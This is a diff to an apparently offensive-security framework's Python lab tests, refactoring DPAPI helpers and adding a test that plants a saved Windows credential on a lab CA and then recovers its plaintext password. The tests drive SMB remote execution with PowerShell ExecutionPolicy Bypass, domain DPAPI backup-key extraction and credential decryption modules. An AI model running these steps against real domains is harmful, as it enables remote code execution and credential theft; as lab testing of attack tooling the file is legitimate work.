@@ -4009,6 +4009,89 @@ class TestDpapiBackupKeyLab(unittest.TestCase):
             console.store.close()
 
 
+def dpapi_ca():
+    from impacket.smbconnection import SMBConnection
+    conn = SMBConnection(HOST, HOST, sess_port=4445, timeout=15)
+    conn.login("Administrator", "P@ssw0rd123", "forge.local")
+    return conn
+
+
+def dpapi_wait_ca_ready():
+    # the CA installs Windows, joins, installs AD CS (~30 min cold):
+    # wait for its oem sentinel
+    deadline = time.time() + 3600
+    while time.time() < deadline:
+        try:
+            conn = dpapi_ca()
+            buf = []
+            conn.getFile("C$", r"OEM\CA-READY.txt", buf.append)
+            raw = b"".join(buf)
+            # PowerShell's Out-File writes UTF-16LE (BOM) on 5.1
+            if raw.startswith(b"\xff\xfe"):
+                text = raw[2:].decode("utf-16-le", "replace").strip()
+            else:
+                text = raw.decode("utf-8", "replace").strip()
+            conn.close()
+            if text == "ready":
+                return
+        except Exception:
+            time.sleep(20)
+
+
+def dpapi_put(conn, path, data):
+    state = {"off": 0}
+
+    def reader(size):
+        chunk = data[state["off"]:state["off"] + size]
+        state["off"] += len(chunk)
+        return chunk
+
+    conn.putFile("C$", path, reader)
+
+
+def dpapi_run_ps1_as_admin(ps1_remote_path, task_name):
+    """Register + start a scheduled task as FORGE\\Administrator via
+    smb_exec: Register-ScheduledTask -Password gets a batch-logon user
+    context with no interactive session — the way the DPAPI fixtures
+    mint per-user state (masterkeys, credential files) on the CA."""
+    regtask_ps1 = (
+        f"$a = New-ScheduledTaskAction -Execute powershell.exe "
+        f"-Argument '-NoProfile -ExecutionPolicy Bypass -File "
+        f"{ps1_remote_path}'\r\n"
+        f"Register-ScheduledTask -TaskName {task_name} -Action $a -User "
+        f"'FORGE\\Administrator' -Password 'P@ssw0rd123' -Force\r\n"
+        f"Start-ScheduledTask -TaskName {task_name}\r\n"
+        f"Start-Sleep -Seconds 10\r\n"
+        f"Unregister-ScheduledTask -TaskName {task_name} "
+        f"-Confirm:$false\r\n")
+    conn = dpapi_ca()
+    try:
+        dpapi_put(conn, r"Users\Public\regtask.ps1", regtask_ps1.encode())
+    finally:
+        conn.close()
+    registry = ModuleRegistry(ROOT / "modules")
+    registry.load()
+    console = FrameworkConsole(registry, Store(":memory:"))
+    try:
+        with contextlib.redirect_stdout(io.StringIO()):
+            for command in (
+                "use exploits/windows/smb_exec",
+                f"set RHOSTS {HOST}",
+                "set RPORT 4445",
+                "set DOMAIN forge.local",
+                "set USERNAME Administrator",
+                "set PASSWORD P@ssw0rd123",
+                # the console's shlex parsing eats backslashes on
+                # set — double them so a literal \ reaches COMMAND
+                "set COMMAND powershell -NoProfile -ExecutionPolicy "
+                "Bypass -File C:\\\\Users\\\\Public\\\\regtask.ps1",
+                "run",
+            ):
+                console.onecmd(command)
+    finally:
+        console.store.close()
+
+
 @unittest.skipUnless(docker_available(), "docker daemon not available")
 @unittest.skipUnless(impacket_available(), "impacket not installed")
 @unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
@@ -4028,7 +4111,7 @@ class TestDpapiMasterkeysLab(unittest.TestCase):
     def setUpClass(cls):
         cls.manager = LabManager(ROOT / "labs")
         cls.manager.up("domain")
-        cls._wait_ca_ready()
+        dpapi_wait_ca_ready()
         cls._ensure_fixture()
 
     @classmethod
@@ -4036,38 +4119,9 @@ class TestDpapiMasterkeysLab(unittest.TestCase):
         cls.manager.down("domain")
 
     @classmethod
-    def _ca(cls):
-        from impacket.smbconnection import SMBConnection
-        conn = SMBConnection(HOST, HOST, sess_port=4445, timeout=15)
-        conn.login("Administrator", "P@ssw0rd123", "forge.local")
-        return conn
-
-    @classmethod
-    def _wait_ca_ready(cls):
-        # the CA installs Windows, joins, installs AD CS (~30 min cold):
-        # wait for its oem sentinel
-        deadline = time.time() + 3600
-        while time.time() < deadline:
-            try:
-                conn = cls._ca()
-                buf = []
-                conn.getFile("C$", r"OEM\CA-READY.txt", buf.append)
-                raw = b"".join(buf)
-                # PowerShell's Out-File writes UTF-16LE (BOM) on 5.1
-                if raw.startswith(b"\xff\xfe"):
-                    text = raw[2:].decode("utf-16-le", "replace").strip()
-                else:
-                    text = raw.decode("utf-8", "replace").strip()
-                conn.close()
-                if text == "ready":
-                    return
-            except Exception:
-                time.sleep(20)
-
-    @classmethod
     def _fixture_present(cls):
         try:
-            conn = cls._ca()
+            conn = dpapi_ca()
         except Exception:
             return False
         try:
@@ -4096,23 +4150,11 @@ class TestDpapiMasterkeysLab(unittest.TestCase):
                 if d.get_longname().startswith("S-1-5-21")]
 
     @classmethod
-    def _put(cls, conn, path, data):
-        state = {"off": 0}
-
-        def reader(size):
-            chunk = data[state["off"]:state["off"] + size]
-            state["off"] += len(chunk)
-            return chunk
-
-        conn.putFile("C$", path, reader)
-
-    @classmethod
     def _ensure_fixture(cls):
         if cls._fixture_present():
             return
-        # CryptProtectData as FORGE\Administrator: Register-ScheduledTask
-        # -Password gets a batch-logon user context with no interactive
-        # session; the task's Protect call mints the masterkey + blob.
+        # CryptProtectData as FORGE\Administrator: the task's Protect
+        # call mints the masterkey + blob
         probe_ps1 = (
             "Add-Type -AssemblyName System.Security\r\n"
             "$b = [Text.Encoding]::UTF8.GetBytes('stage2-probe')\r\n"
@@ -4120,42 +4162,12 @@ class TestDpapiMasterkeysLab(unittest.TestCase):
             "$b, $null, 'CurrentUser')\r\n"
             "[IO.File]::WriteAllBytes("
             "'C:\\Users\\Public\\probe.blob', $e)\r\n")
-        regtask_ps1 = (
-            "$a = New-ScheduledTaskAction -Execute powershell.exe "
-            "-Argument '-NoProfile -ExecutionPolicy Bypass -File "
-            "C:\\Users\\Public\\probe.ps1'\r\n"
-            "Register-ScheduledTask -TaskName fz -Action $a -User "
-            "'FORGE\\Administrator' -Password 'P@ssw0rd123' -Force\r\n"
-            "Start-ScheduledTask -TaskName fz\r\n"
-            "Start-Sleep -Seconds 10\r\n"
-            "Unregister-ScheduledTask -TaskName fz -Confirm:$false\r\n")
-        conn = cls._ca()
+        conn = dpapi_ca()
         try:
-            cls._put(conn, r"Users\Public\probe.ps1", probe_ps1.encode())
-            cls._put(conn, r"Users\Public\regtask.ps1", regtask_ps1.encode())
+            dpapi_put(conn, r"Users\Public\probe.ps1", probe_ps1.encode())
         finally:
             conn.close()
-        registry = ModuleRegistry(ROOT / "modules")
-        registry.load()
-        console = FrameworkConsole(registry, Store(":memory:"))
-        try:
-            with contextlib.redirect_stdout(io.StringIO()):
-                for command in (
-                    "use exploits/windows/smb_exec",
-                    f"set RHOSTS {HOST}",
-                    "set RPORT 4445",
-                    "set DOMAIN forge.local",
-                    "set USERNAME Administrator",
-                    "set PASSWORD P@ssw0rd123",
-                    # the console's shlex parsing eats backslashes on
-                    # set — double them so a literal \ reaches COMMAND
-                    "set COMMAND powershell -NoProfile -ExecutionPolicy "
-                    "Bypass -File C:\\\\Users\\\\Public\\\\regtask.ps1",
-                    "run",
-                ):
-                    console.onecmd(command)
-        finally:
-            console.store.close()
+        dpapi_run_ps1_as_admin(r"C:\Users\Public\probe.ps1", "fz")
         # the task runs after the service fires it — poll for the artifacts
         deadline = time.time() + 120
         while time.time() < deadline:
@@ -4193,7 +4205,7 @@ class TestDpapiMasterkeysLab(unittest.TestCase):
             loot = console.store.loot("masterkey")
             self.assertGreaterEqual(len(loot), 1)
             from impacket.dpapi import DPAPI_BLOB
-            conn = self._ca()
+            conn = dpapi_ca()
             try:
                 raw = []
                 conn.getFile("C$", r"Users\Public\probe.blob", raw.append)
@@ -4206,6 +4218,108 @@ class TestDpapiMasterkeysLab(unittest.TestCase):
             # does the SHA1 + both session-key HMAC variants internally)
             plaintexts = [blob.decrypt(k) for k in recovered]
             self.assertIn(b"stage2-probe", plaintexts)
+        finally:
+            console.store.close()
+
+
+@unittest.skipUnless(docker_available(), "docker daemon not available")
+@unittest.skipUnless(impacket_available(), "impacket not installed")
+@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
+class TestDpapiCredentialsLab(unittest.TestCase):
+    """DPAPI stage 3, end to end: a scheduled task runs cmdkey as
+    FORGE\\Administrator on the CA (a REAL Credential Manager entry —
+    no synthetic crypto), dpapi_backupkey pulls the domain backup key,
+    dpapi_credentials unwraps the masterkey + credential file it finds
+    over SMB, and the plaintext (target, username, secret) lands in
+    creds + loot. Fixture is created here when missing (cold lab)."""
+
+    CREDDIR = r"Users\Administrator\AppData\Roaming\Microsoft\Credentials"
+
+    @classmethod
+    def setUpClass(cls):
+        cls.manager = LabManager(ROOT / "labs")
+        cls.manager.up("domain")
+        dpapi_wait_ca_ready()
+        cls._ensure_fixture()
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.manager.down("domain")
+
+    @classmethod
+    def _fixture_present(cls):
+        try:
+            conn = dpapi_ca()
+        except Exception:
+            return False
+        try:
+            entries = [f.get_longname() for f in
+                       conn.listPath("C$", cls.CREDDIR + r"\*")
+                       if not f.is_directory()]
+            # credential files are hash-named (32-hex), not guids
+            return len(entries) > 0
+        except Exception:
+            return False
+        finally:
+            conn.close()
+
+    @classmethod
+    def _ensure_fixture(cls):
+        if cls._fixture_present():
+            return
+        # cmdkey as FORGE\Administrator mints the credential file (and
+        # the masterkey that protects it, on first use)
+        cred_ps1 = (
+            "cmdkey /add:fileserver.forge.local "
+            "/user:FORGE\\backupsvc /pass:BackupPass2024!\r\n")
+        conn = dpapi_ca()
+        try:
+            dpapi_put(conn, r"Users\Public\cred.ps1", cred_ps1.encode())
+        finally:
+            conn.close()
+        dpapi_run_ps1_as_admin(r"C:\Users\Public\cred.ps1", "fzcred")
+        deadline = time.time() + 120
+        while time.time() < deadline:
+            if cls._fixture_present():
+                return
+            time.sleep(5)
+        raise AssertionError("DPAPI credential fixture did not "
+                             "materialize on the CA")
+
+    def test_saved_logon_decrypted(self):
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            buf = io.StringIO()
+            with contextlib.redirect_stdout(buf):
+                for command in (
+                    "use auxiliary/attack/dpapi_backupkey",
+                    f"set RHOSTS {HOST}",
+                    "set DOMAIN forge.local",
+                    "set USERNAME Administrator",
+                    "set PASSWORD P@ssw0rd123",
+                    "run",
+                    "use auxiliary/attack/dpapi_credentials",
+                    f"set RHOSTS {HOST}",
+                    "set RPORT 4445",
+                    "set DOMAIN forge.local",
+                    "set USERNAME Administrator",
+                    "set PASSWORD P@ssw0rd123",
+                    "run",
+                ):
+                    console.onecmd(command)
+            out = buf.getvalue()
+            self.assertNotIn("Traceback", out)
+            self.assertIn("fileserver.forge.local", out)
+            self.assertIn("BackupPass2024!", out)
+            loot = console.store.loot("credential")
+            self.assertTrue(any("fileserver.forge.local" in l["label"]
+                                for l in loot))
+            creds = console.store.creds()
+            self.assertTrue(any(c["username"] == "FORGE\\backupsvc"
+                                and c["password"] == "BackupPass2024!"
+                                for c in creds))
         finally:
             console.store.close()
 
